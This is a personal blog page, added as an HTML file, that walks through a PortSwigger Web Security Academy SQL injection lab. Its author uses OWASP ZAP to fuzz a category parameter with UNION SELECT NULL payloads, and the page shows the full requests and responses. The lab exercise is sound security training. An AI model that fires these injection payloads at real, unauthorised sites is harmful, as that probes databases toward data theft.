@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><title>Determining the Number of Columns Returned by a Query Using SQLi &ndash; Chaotic Solutions</title>
+<meta name="description" content="A blog about things that can be used, by people.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="http://kurobeats.github.io/css/palettes/dracula.css">
+<link rel="stylesheet" href="http://kurobeats.github.io/css/risotto.css">
+<link rel="stylesheet" href="http://kurobeats.github.io/css/custom.css">
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="http://kurobeats.github.io/" class="page__logo-inner">Chaotic Solutions</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://kurobeats.github.io/posts/" title="">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>Determining the Number of Columns Returned by a Query Using SQLi</h1>
+    </header>
+    
+    <div class="content__body">
+        <p>Note: This was part of an overall effort to complete PortSwigger&rsquo;s Web Security Academy without Burp Suite.</p>
+<p>If we take the URL <code>https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories</code> it can be seen that the category parameter is being used. Nothing new there. Let&rsquo;s see if when we give it something unexpected, it throws an error/s. Something like <code>'+UNION+SELECT+NULL--</code> at the end, like so:</p>
+<p><code>https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories'+UNION+SELECT+NULL--</code></p>
+<p>Ok, something bad is happening, I got the following when I send a GET request to that URL:</p>
+<pre tabindex="0"><code>HTTP/1.1 500 Internal Server Error
+Connection: close
+Content-Length: 21
+
+Internal Server Error
+</code></pre><p>It might be nothing, but it might not be. Let&rsquo;s keep adding null values until the error disappears (if at all) and see if the response includes additional content containing the null values.</p>
+<p>ZAP fuzzer will do this easily. Here&rsquo;e the base request:</p>
+<pre tabindex="0"><code>GET https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Cookie: session=FTZuxjD1runfaB9lKsJJiQbHzdbgQUwQ
+Upgrade-Insecure-Requests: 1
+Host: ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net
+</code></pre><p>The setup in ZAP&rsquo;s Fuzzer with the fuzz location highlighted:</p>
+<p><img src="/img/f5da81b4f48e81fd2b776ddf654c4d26.png" alt="f5da81b4f48e81fd2b776ddf654c4d26.png"></p>
+<p>The payload strings:</p>
+<p><img src="/img/57a03f00772b20b8dd4e4b27895f835a.png" alt="57a03f00772b20b8dd4e4b27895f835a.png"></p>
+<p>The result, looking good!</p>
+<p><img src="/img/0183df5146de20552126830324cd86c7.png" alt="0183df5146de20552126830324cd86c7.png"></p>
+<p>Here&rsquo;s the payload used that got the result:</p>
+<pre tabindex="0"><code>GET https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories%20&#39;+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Cookie: session=FTZuxjD1runfaB9lKsJJiQbHzdbgQUwQ
+Upgrade-Insecure-Requests: 1
+Host: ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net
+</code></pre><p>3 NULLs was the winner. Let&rsquo;s see what the web browser shows us with this request:</p>
+<p><img src="/img/7ec32123d821db933f9b5d7710bc59d1.png" alt="7ec32123d821db933f9b5d7710bc59d1.png"></p>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    <img class="about__logo" src="http://kurobeats.github.io/img/favicon.png" alt="Logo">
+<h1 class="about__title">Chaotic Solutions</h1>
+<p class="about__description">A blog about things that can be used, by people.</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/kurobeats" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://discordapp.com/users/218920799967510529" rel="me" aria-label="Discord" title="Discord"><i class="fa-brands fa-discord" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://au.linkedin.com/in/acozamanis" rel="me" aria-label="LinkedIn" title="LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    <p>In this brief piece, you&#39;ll learn about using OWASP ZAP to determining the number of columns returned by a query using SQLi.</p>
+    
+        <p>
+            By Anthony Cozamanis, 
+            2023-05-13
+        </p>
+    
+
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+</p>
+<br /><br />
+<p class="copyright">Anthony Cozamanis (CC BY 4.0)</p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
